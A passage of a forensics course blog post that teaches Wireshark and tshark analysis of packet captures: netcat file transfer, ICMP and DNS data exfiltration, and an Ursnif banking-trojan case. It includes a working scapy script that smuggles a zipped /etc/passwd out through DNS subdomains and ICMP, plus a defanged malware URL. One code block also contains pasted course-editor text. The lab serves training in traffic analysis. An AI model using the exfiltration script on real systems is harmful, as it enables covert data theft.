Next step will be the easiest: sending data on the right port using netcat:</p>

<pre><code class="language-bash">$ echo &quot;Students cyber mooc !&quot; | nc 172.17.0.2 1664
</code></pre>

<p><center>
<img src="https://i.imgur.com/hmtsiD7.gif" alt="" />
<em>Fig 23</em>: Do it yourself
</center></p>

<h2 id="file-transfer">File transfer</h2>

<h3 id="statement-1">Statement</h3>

<p>In this PCAP file there is also some TCP traffic. But this time it&rsquo;s not a text message, but a file. The purpose of this practical exercise will be to find it and open it to see what this mysterious file contains.</p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>Hash</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>filetransfer.pcapng</td>
<td>b1cfd7c12581d9b0b2c99008d3a7e746</td>
<td><a href="https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM">https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM</a></td>
</tr>
</tbody>
</table>

<h3 id="resolution-1">Resolution</h3>

<p>As in the previous practical exercise, there is no need to do a statistical analysis to see what contains the PCAP file. Normally now you don&rsquo;t have any excuses for not having the <strong>data.data</strong> and <strong>data.text</strong> columns.</p>

<p>When opening the file, you can see interesting bytes:</p>

<p><center>
<img src="https://i.imgur.com/SWgxpi3.png" alt="" />
<em>Fig 24</em>: PNG Headers detected
</center></p>

<p>In the red frame you can see <strong>PNG</strong>, this acronym is rather explicit, but we will talk a little bit about file structures.
Almost all files have signatures, which is why our operating systems can open them with the appropriate software, even if you specify a wrong extension. In addition, the <strong>file</strong> command on Linux uses the signature to return its type.
In the brown frame, we can see hexadecimal, the beginning of what seems to be a PNG. The signature present at the beginning and at the end of the files, is called <strong>magic numbers</strong>.
If google that, you can easily find the magic numbers of a PNG:</p>

<p><center>
<img src="https://i.imgur.com/h56S9RH.png" alt="" />
<em>Fig 25</em>: PNG file signature
</center></p>

<p>Exactly these bytes are present in the brown frame. We can deduce that we are dealing with a PNG image that has been transferred. The <strong>libpng</strong> site tells us a little more about the structure of a PNG. In particular, the signature at the end containing <strong>IEND</strong> chunk:</p>

<p><center>
<img src="https://i.imgur.com/9iiG1DS.png" alt="" />
<em>Fig 26</em>: PNG footer
</center></p>

<p>As we can see in the red frame, it&rsquo;s a PNG file:</p>

<p><center>
<img src="https://i.imgur.com/pd90wv9.png" alt="" />
<em>Fig 27</em>: IEND Chunk in the PCAP
</center></p>

<p>Another method to find the PNG file is using <strong>binwalk</strong>, as I said in tooling section, binwalk is carving tool. It will detect and try to identify file structure:</p>

<p><center>
<img src="https://i.imgur.com/4DN9qgb.png" alt="" />
<em>Fig 28</em>: Binwalk on the PCAP file
</center></p>

<p>Now we are 100% sure that our transferred file is a full PNG image.
As said several times before, Wireshark is based on a tool called <strong>tshark</strong>. It has the advantage of being in CLI, so with a little practice, we can easily extract the desired data:</p>

<p><center>
<img src="https://i.imgur.com/uEwXqiL.png" alt="" />
<em>Fig 29</em>: Extract the picture
</center></p>

<ul>
<li><strong>Red frame</strong>: This is the tshark command. The PCAP file is opened and is displaying the raw content of data.data column.</li>
<li><strong>Yellow frame</strong>: The <strong>tr -d</strong> command will allow you to delete one or more characters. The output of <strong>tshark</strong> with the filter <strong>data.data</strong> looks like <strong>00:11:22:22:33:44</strong>&hellip; with line breaks between each packet. <strong>tr</strong> allows me to delete these characters to have hexdecimal data on a single line.</li>
<li><strong>Brown frame</strong>: This hexadecimal line represents our PNG picture. Just decode it in a file to retrieve a valid PNG and complete the challenge.</li>
</ul>

<p><center>
<img src="https://i.imgur.com/MbP0OQy.gif" alt="" />
<em>30</em>: Final resolution
</center></p>

<h3 id="do-it-yourself-1">Do it yourself</h3>

<h4 id="prerequisite">Prerequisite</h4>

<p>As the last &ldquo;Do it yourself&rdquo; (DIY) I told you to use Docker. In fact, it&rsquo;s not necessary:</p>

<ul>
<li>netcat</li>
<li>Wireshark / tshark</li>
</ul>

<h4 id="send-the-picture">Send the picture</h4>

<p>In this &ldquo;Do it yourself&rdquo;, I&rsquo;m going to use the <strong>loopback (lo)</strong> network interface. Instead of docker network interface. The main advantage of using this interface is the absence of noise during Wireshark capture session.</p>

<p>Open a linux terminal:</p>

<pre><code class="language-bash">$ nc -lvp 3615 &gt; test.out
</code></pre>

<p>As the last DIY, open Wireshark but listen on <strong>lo</strong> interface instead of <strong>docker</strong> one. When everything is properly set up, open a second linux terminal and send it to the desired TCP port:</p>

<pre><code class="language-bash">$ cat flag.png | nc 127.0.0.1 3615
</code></pre>

<p><center>
<img src="https://i.imgur.com/PfHFaKe.png" alt="" />
<em>Fig 31</em>: PNG file over netcat
</center></p>

<p>As we can see, both file are similar.</p>

<h2 id="data-exfiltration">Data exfiltration</h2>

<h3 id="statement-2">Statement</h3>

<p>When an attacker has been successfully compromised a target, he will tries to extract data as discreetly as possible. ICMP and DNS protocols are oftenly used for this. In the following PCAP file, an evil hacker has stole some sensitive data.</p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>Hash</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>exfiltration.pcapng</td>
<td>1e481b149ee2d65c02d1eaea19aaedfa</td>
<td><a href="https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk">https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk</a></td>
</tr>
</tbody>
</table>

<h3 id="resolution-2">Resolution</h3>

<p>When you open the PCAP file, you can see several protocols, such as ARP, ICMP, and DNS. If your columns look like mine, you should see data quickly in the ICMP, which should not contain any.
Then, the subdomains for DNS requests are a little strange, to make it easier to read, I added a column with the filter <strong>dns.qry.name</strong>:</p>

<p><center>
<img src="https://i.imgur.com/WiAAKim.png" alt="" />
<em>Fig 32</em>: Overview of the PCAP
</center></p>

<p>If you have correctly understood the previous practical exercise, then extracting the data here shouldn&rsquo;t be too difficult. In this PCAP file, I left the &ldquo;noise&rdquo; (ARP, ICMP with DNS), before starting to recover anything, we have to start making some hypotheses:</p>

<ul>
<li>What we know

<ul>
<li>ICMP hex data looks to ASCII characters</li>
<li>DNS subdomains looks to base64 encoded data</li>
</ul></li>
<li>Hypotheses

<ul>
<li>Are ICMP decoded data printable?</li>
<li>What&rsquo;s the data hide in subdomains?</li>
<li>Are ICMP and DNS data related to each other?</li>
</ul></li>
</ul>

<p>Before taking out the heavy artillery and diving head down and extract everything, let&rsquo;s try to extract the first ICMP package and the first sub-domain. Just right click on the desired element and copy the value, and decode them in your terminal:</p>

<pre><code class="language-bash">$ echo -n &quot;546865206b657920&quot; | xxd -r -p
The key

$ echo -n &quot;UEsDBBQACQAIAHOFd01q&quot; | base64 -d
PK     s�wMj

$ echo -n &quot;UEsDBBQACQAIAHOFd01q&quot; | base64 -d | xxd -p
504b03041400090008007385774d6a
</code></pre>

<p><center>
<img src="https://i.imgur.com/zeUKVar.gif" alt="" />
<em>Fig 33</em>: Decode first packet of ICMP and DNS
</center></p>

<p>The data contained in the ICMP is indeed ASCII encoded in hexa. The subdomain contains the characters &ldquo;PK&rdquo; followed by non-printable characters&hellip; Ok, let&rsquo;s try to find what type of file it is. According to the following figure, I just decoded the base64 of the first subdomain and print it as hex:</p>

<p><center>
<img src="https://i.imgur.com/deJyBbA.png" alt="" />
<em>Fig 34</em>: Hex data of the first subdomain
</center></p>

<p>As the previous practical exercise,I went to the wikipedia page of file signatures and found that the first 4 bytes corresponded to the magic number of a ZIP archive:</p>

<p><center>
<img src="https://i.imgur.com/xWNINBw.png" alt="" />
<em>Fig 35</em>: ZIP magic number
</center></p>

<p>Now, we can answer to our previous hypotheses:</p>

<ul>
<li>Is ICMP data is printable?

<ul>
<li>Yes, it starts with &ldquo;The key&rdquo;.</li>
</ul></li>
<li>Are encoded subdomains contains something relevant?

<ul>
<li>Probably, there is ZIP magic number in the first subdomain.</li>
</ul></li>
<li>Are both protocol related to each other?

<ul>
<li>Don&rsquo;t know yet.</li>
</ul></li>
</ul>

<p>Before starting with new hypotheses, let&rsquo;s extract everything:</p>

<pre><code class="language-bash">$ tshark -r exfiltration.pcapng -Y icmp.resp_to -T fields -e data.text | xxd -r -p
The key of the encrypted archive is: CyberMoocMooc

$ tshark -r exfiltration.pcapng -Y 'ip.src == 172.17.0.1 &amp;&amp; !icmp' -T fields -e dns.qry.name | sed 's/\.makictf\.wtf//g' | base64 -d
PK     s�wMjR��LY
                 passwd_fileUT    9.�[
[...]
</code></pre>

<p>When I&rsquo;m trying to unzip the archive, it asks me for a password. Let&rsquo;s try with &ldquo;CyberMoocMooc&rdquo;:</p>

<p><center>
<img src="https://i.imgur.com/yfltI04.gif" alt="" />
<em>Fig 36</em>: Final resolution
</center></p>

<h3 id="do-it-yourself-2">Do it yourself</h3>

<p>As for the clear TCP, I made a small docker. This time I based the container on the image of <strong>Python2 - Alpine</strong>, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: <strong>Responder</strong>.</p>

<h4 id="server-side">Server side</h4>

<pre><code class="language-yaml">FROM python:2-alpine

RUN apk add git

RUN mkdir /responder &amp;&amp; git clone https://github.com/SpiderLabs/Responder.git /responder

COPY run.sh /run.sh
RUN chmod +x /run.sh

ENTRYPOINT [&quot;/run.sh&quot;]
</code></pre>

<p>And the <strong>run.sh</strong> script:</p>

<pre><code class="language-bash">#!/bin/sh

INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//')
cd /responder &amp;&amp; ./Responder.py -I $INTERFACE -wrf
</code></pre>

<p>Time to build and start our docker:</p>

<pre><code class="language-bash">$ sudo docker build . -t responder &amp;&amp; sudo docker run --rm --name responder -t responder
</code></pre>

<p>You should got something like that:</p>

<p><center>
<img src="https://i.imgur.com/jUdHqiZ.png" alt="" />
<em>37</em>: Responder up
</center></p>

<h4 id="client-side">Client side</h4>

<p>For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:</p>

<pre><code class="language-python">
TP3 - Data exfiltration

    Preview
    Edit
    Reports
    Grade essays

Do it yourself

As for the clear TCP, I made a small docker. This time I based the container on the image of Python2 - Alpine, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: Responder.
1. Server side


FROM python:2-alpine

MAINTAINER Alan MARREC &lt;amarrec@protonmail.com&gt;

RUN apk add git

RUN mkdir /responder &amp;&amp; git clone https://github.com/SpiderLabs/Responder.git /responder

COPY run.sh /run.sh
RUN chmod +x /run.sh

ENTRYPOINT [&quot;/run.sh&quot;]

And the run.sh script:


#!/bin/sh

INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//')
cd /responder &amp;&amp; ./Responder.py -I $INTERFACE -wrf


Time to build and start our docker:


$ sudo docker build . -t responder &amp;&amp; sudo docker run --rm --name responder -t responder

You should got something like that:

Fig 1: Responder up

Fig 1: Responder up
2. Client side

For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic:


#!/usr/bin/python3
#-*- coding: utf-8 -*-

from scapy.all import *
import binascii
import base64

destIP = &quot;172.17.0.2&quot;

'''
Exfiltration with ICMP

@param mesg: Input to send through ICMP - C{bytes}
@return: No return, sends packets.
'''
def ping_exf(mesg):
    hex_mesg = str(binascii.hexlify(bytes(mesg, 'utf8')))[2:-1] # Removing of b' at start and ' at end
    n = 16 # Size of block
    list_split = [hex_mesg[i:i+n] for i in range(0, len(hex_mesg), n)] # Split string into list
    for i in range(0,len(list_split)):
        print(list_split[i])
        send(IP(dst=destIP)/ICMP()/list_split[i])

'''
Exfiltration with DNS A requests. Send an archive / file or wathever
splitted into 20 char / packet.
Don't forget to put a responder server on the target. 
Responder will up a DNS server that accept all requests, even wrong one.

@param mesg: Input to send via DNS A requests - C{bytes}
@return: No return, sends packets.
'''
def dns_exf(mesg):
    mesg = base64.b64encode(mesg)
    n = 20
    list_split = [mesg[i:i+n] for i in range(0, len(mesg), n)]
    
    for i in range(0, len(list_split)):
        print(str(list_split[i])[2:-1])
        part = (&quot;%s.makictf.wtf&quot; % str(list_split[i])[2:-1])
        sr1(IP(dst=destIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=part)),verbose=0)

if __name__ == &quot;__main__&quot;:
    key_archive = &quot;The key of the encrypted archive is: CyberMoocMooc&quot;
    
    f = open('passwd.zip','rb')
    enc_archive = f.read()
    f.close()
   
    ping_exf(key_archive)
    dns_exf(enc_archive)
</code></pre>

<p>This script will convert a file to base64, then send it to fictitious subdomains. Just before, a string in hex is sent by ICMP. As part of our TP, I propose you to make an encrypted zip archive and send it by DNS, the key would be sent by ICMP.</p>

<pre><code class="language-bash">$ zip -e passwd.zip /etc/passwd
Enter password: [Enter your password]
</code></pre>

<p>It is now time to run Wireshark and the exfil_gen.py script. When the script is completed, then we can stop Wireshark capture and save the traffic into a PCAP file.</p>

<h2 id="trojan-horse">Trojan horse</h2>

<p>In this practical exercise, it will not be a CTF challenge task. It will be a real forensic case, with a real bad malware inside it. <strong>Then be careful with this PCAP, it contains a banking trojan</strong>.</p>

<h3 id="statement-3">Statement</h3>

<p>The PCAP file can be download here:</p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>Hash</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>2018-11-13-traffic-analysis-exercise.pcap</td>
<td>221168dc0865c145fe977b2c373022f3</td>
<td><a href="https://tinyurl.com/TP-malicious">https://tinyurl.com/TP-malicious</a></td>
</tr>
</tbody>
</table>

<p>This practical exercise comes from: <a href="https://www.malware-traffic-analysis.net/2018/11/13/index.html">https://www.malware-traffic-analysis.net/2018/11/13/index.html</a></p>

<p>And here is the questions to answer:</p>

<ul>
<li>What was the date and time the malicious traffic started?</li>
<li>What is the MAC address of the infected Windows host?</li>
<li>What is the host name of the infected Windows host?</li>
<li>What is the user account name used on the infected Windows host?</li>
<li>What URL in the pcap returned a Windows executable file?</li>
<li>What is the size of the Windows executable file from that URL?</li>
<li>What is the SHA256 hash of the Windows executable file from that URL?</li>
<li>What type of malware is the Windows executable returned from that URL?</li>
</ul>

<h3 id="resolution-3">Resolution</h3>

<p>You can find the official correction here, the password of the archive is &ldquo;<strong>infected</strong>&rdquo; : <a href="https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip">https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip</a></p>

<h4 id="what-url-in-the-pcap-returned-a-windows-executable-file">What URL in the pcap returned a Windows executable file?</h4>

<p>I didn&rsquo;t do as the original author. I tried to find the malware first. I just did a research with &ldquo;data.data&rdquo; filter:</p>

<p><center>
<img src="https://i.imgur.com/rkmPE4c.png" alt="" />
<em>Fig 38</em>: Finding the PE
</center></p>

<p>As you can see in the red frame, there is a magic number. This magic number is for a PE file, or a Windows executable (portable executable).</p>

<p>If your &ldquo;data.text&rdquo; column is blank, you should modify your Wireshark preferences for &ldquo;data&rdquo; protocol:</p>

<p><center>
<img src="https://i.imgur.com/QmQxT1M.gif" alt="" />
<em>Fig 39</em>: Display data in &ldquo;data.text&rdquo; column
</center></p>

<p>According to the signature list on Wikipedia (cf. Resource 1):</p>

<p><center>
<img src="https://i.imgur.com/i4SFNu7.png" alt="" />
<em>Fig 40</em>: Windows executable magic number
</center></p>

<p>Donc, nous avons bien un executable Windows. Surement notre malware. À ce stade, il est possible de répondre à la question &ldquo;What URL in the pcap returned a Windows executable file&rdquo;:</p>

<p><center>
<img src="https://i.imgur.com/Ug1yPC0.gif" alt="" />
<em>Fig 41</em>: Follow HTTP Stream
</center></p>

<p>Then:</p>

<blockquote>
<p>hxxp://shumbildac[.]com/WES/fatog.php?l=ngul5.xap</p>
</blockquote>

<h4 id="what-is-the-size-of-the-windows-executable-file-from-that-url">What is the size of the Windows executable file from that URL?</h4>

<p>Now I have to extract the PE file. You can do it with wireshark, or tshark:</p>

<p><center>
<img src="https://i.imgur.com/0uBbNN9.gif" alt="" />
<em>Fig 42</em>: Extraction with Wireshark Objects
</center></p>

<p><center>
<img src="https://i.imgur.com/tfxL8Wl.gif" alt="" />
<em>Fig 43</em>: tshark extraction
</center></p>

<p>Then finding the size is quite easy now:</p>

<p><center>
<img src="https://i.imgur.com/GlFMqni.png" alt="" />
<em>Fig 44</em>: Binary size
</center></p>

<h4 id="what-is-the-sha256-hash-of-the-windows-executable-file-from-that-url">What is the SHA256 hash of the Windows executable file from that URL?</h4>

<p>As above, it&rsquo;s will be easy to find the hash:</p>

<p><center>
<img src="https://i.imgur.com/8Xz2Vzw.png" alt="" />
<em>Fig 45</em>: Hash SHA256 of the executable file
</center></p>

<blockquote>
<p>97f149f146b0ec63c32abff204ae27638f0310536172b0f718f1a91a5672fe71</p>
</blockquote>

<h4 id="what-type-of-malware-is-the-windows-executable-returned-from-that-url">What type of malware is the Windows executable returned from that URL?</h4>

<p>We can check our file on VirusTotal.com. No need to upload the file, if it&rsquo;s a well known malware, the hash is enough:</p>

<p><center>
<img src="https://i.imgur.com/jAdnI8N.gif" alt="" />
<em>Fig 46</em>: VirusTotal results
</center></p>

<p>It looks to be &ldquo;Ursnif&rdquo; banking malware, don&rsquo;t run it on you Windows host!</p>

<h4 id="what-was-the-date-and-time-the-malicious-traffic-started">What was the date and time the malicious traffic started?</h4>

<p>Now that we found the malware, we can assume the date and time of the malicious traffic:</p>

<p><center>
<img src="https://i.imgur.com/bETDt1d.png" alt="" />
<em>Fig 47</em>: Date and time of malicioud traffic
</center></p>

<blockquote>
<p>At 2018/11/07 around 20:47</p>
</blockquote>

<h4 id="what-is-the-mac-address-of-the-infected-windows-host">What is the MAC address of the infected Windows host?</h4>

<p>We can see the destination IP on the above screen: <strong>10.22.15.119</strong>. It should be our infected Windows host. So the mac address is:</p>

<p><center>
<img src="https://i.imgur.com/AuSZ3Uy.png" alt="" />
<em>Fig 48</em>: Mac address
</center></p>

<blockquote>
<p>00:11:2f:d1:6e:52</p>
</blockquote>

<h4 id="what-is-the-host-name-of-the-infected-windows-host">What is the host name of the infected Windows host?</h4>

<p>To find a Windows hostname, I can filter on the IP and the DHCP protocol (<strong>bootp</strong> in Wireshark):</p>

<p><center>
<img src="https://i.imgur.com/BxRbGKd.png" alt="" />
<em>Fig 49</em>: Filtered on DHCP and the IP
</center></p>

<p>Then, the hostname is:</p>

<blockquote>
<p>Danger-Win-PC</p>
</blockquote>

<h4 id="what-is-the-user-account-name-used-on-the-infected-windows-host">What is the user account name used on the infected Windows host?</h4>

<p>Ok, it&rsquo;s a Windows, we can guess some Kerberos traffic:</p>

<p><center>
<img src="https://i.imgur.com/rlg0i4c.png" alt="" />
<em>Fig 50</em>: Filtering on kerberos
</center></p>

<p>Now, you can add a new column:</p>

<p><center>
<img src="https://i.imgur.com/RaazFrU.gif" alt="" />
<em>Fig 51</em>: Account name
</center></p>

<blockquote>
<p>carlos.danger</p>
</blockquote>

<p>And now we answered to all the questions! :D</p>

<h2 id="ressources">Ressources</h2>

<ol>
<li>Wireshark team, We&rsquo;re switching to Qt, October 2013, Wireshark blog: <a href="https://blog.wireshark.org/2013/10/switching-to-qt/">https://blog.wireshark.org/2013/10/switching-to-qt/</a></li>
<li>Wireshark team, Man page tshark, Wireshark documentations: <a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></li>
<li>Maki, OtterCTF 2018, 24 December, Maki blog: <a href="https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak">https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak</a></li>
<li>diceone, diceone/capanalysis docker, 2016, Docker Hub: <a href="https://hub.docker.com/r/diceone/capanalysis/">https://hub.docker.com/r/diceone/capanalysis/</a></li>
<li>CapAnalysis team, PCAP of another point of view, CapAnalysis official website: <a href="https://www.capanalysis.net/ca/">https://www.capanalysis.net/ca/</a></li>
<li>ReFirmLabs, Binwalk, 2018, Official GitHub: <a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a></li>
<li>korczis, Foremost, 2016, Official GitHub: <a href="https://github.com/korczis/foremost">https://github.com/korczis/foremost</a></li>
<li>PyShark, PyShark, Python packet parser using wireshark&rsquo;s tshark, Official GitHub: <a href="https://kiminewt.github.io/pyshark/">https://kiminewt.github.io/pyshark/</a></li>
<li>Scapy team, Scapy project, Official website: <a href="https://scapy.net/">https://scapy.net/</a></li>
<li>Linux-France team, grep man page, Linux-France: <a href="http://www.linux-france.org/article/man-fr/man1/grep-1.html">http://www.linux-france.org/article/man-fr/man1/grep-1.html</a></li>
<li>Die team, strings man page, die website: <a href="https://linux.die.net/man/1/strings">https://linux.die.net/man/1/strings</a></li>
<li>Linuxcommand team, tr man page, linuxcommand: <a href="http://linuxcommand.org/lc3_man_pages/tr1.html">http://linuxcommand.org/lc3_man_pages/tr1.html</a></li>
<li>Systutorials team, xxd man page, systutorials: <a href="https://www.systutorials.com/docs/linux/man/1-xxd/">https://www.systutorials.com/docs/linux/man/1-xxd/</a></li>
<li>Wikipedia, ISO 8601, Wikipedia: <a href="https://fr.wikipedia.org/wiki/ISO_8601">https://fr.wikipedia.org/wiki/ISO_8601</a></li>
<li>cURL, curl.1 the man page, haxx.se: <a href="https://curl.haxx.se/docs/manpage.html">https://curl.haxx.se/docs/manpage.html</a></li>
<li>Nico, Netcat parce que c&rsquo;est trop fast0ch&rsquo;, 20 December 2009, Les tutos de Nico: <a href="http://www.lestutosdenico.com/tutos-de-nico/netcat">http://www.lestutosdenico.com/tutos-de-nico/netcat</a></li>
<li>Pentester Academy, Learn pentesting online, pentesteracademy.com: <a href="https://www.pentesteracademy.com/">https://www.pentesteracademy.com/</a></li>
<li>pentesteracademy, PA Toolkit (Pentester Academy Wireshark Toolkit), 2018, Official GitHub: <a href="https://github.com/pentesteracademy/patoolkit">https://github.com/pentesteracademy/patoolkit</a></li>
<li>Wikipedia, Indicator of compromise, Wikipedia: <a href="https://en.wikipedia.org/wiki/Indicator_of_compromise">https://en.wikipedia.org/wiki/Indicator_of_compromise</a></li>
<li>Wireshark team, Display filter in Wireshark, Official Wireshark wiki: <a href="https://wiki.wireshark.org/DisplayFilters">https://wiki.wireshark.org/DisplayFilters</a></li>
<li>Wikipedia, Base64, Wikipedia: <a href="https://en.wikipedia.org/wiki/Base64">https://en.wikipedia.org/wiki/Base64</a></li>
<li>Wireshark team, Man page tshark, Wireshark documentations: <a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></li>
<li>Linuxcommand team, tr man page, linuxcommand: <a href="http://linuxcommand.org/lc3_man_pages/tr1.html">http://linuxcommand.org/lc3_man_pages/tr1.html</a></li>
<li>Systutorials team, xxd man page, systutorials: <a href="https://www.systutorials.com/docs/linux/man/1-xxd/">https://www.systutorials.com/docs/linux/man/1-xxd/</a></li>
<li>Man team, rev(1) Linux man page, man7: <a href="http://man7.org/linux/man-pages/man1/rev.1.html">http://man7.org/linux/man-pages/man1/rev.1.html</a></li>
<li>Die team, base64(1) man page, die: <a href="https://linux.die.net/man/1/base64">https://linux.die.net/man/1/base64</a></li>
<li>SpiderLabs, Responder, 2017, GitHub: <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li>
<li>Python crew, python docker, DockerHub: <a href="https://hub.docker.com/_/python/">https://hub.docker.com/_/python/</a></li>
<li>VirusTotal, Analyze malicious file, VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li>admin, Ursnif reloaded: tracing the latest trojan campaigns, 19/11/18, reaqta.com: <a href="https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/">https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/</a></li>
<li>Wireshark team, Dynamic Host Configuration Protocol (DHCP), Wireshark official blog: <a href="https://wiki.wireshark.org/DHCP">https://wiki.wireshark.org/DHCP</a></li>
</ol>

	</div>
</article>

		</div>
		
	
<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
	
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



	


	<script>
    (function() {
      var toc = document.getElementById('TableOfContents');
      if (!toc) return;
      do {
        var li, ul = toc.querySelector('ul');
        if (ul.childElementCount !== 1) break;
        li = ul.firstElementChild;
        if (li.tagName !== 'LI') break;
        
        ul.outerHTML = li.innerHTML;
      } while (toc.childElementCount >= 1);
    })();
  </script>

	</body>
</html>
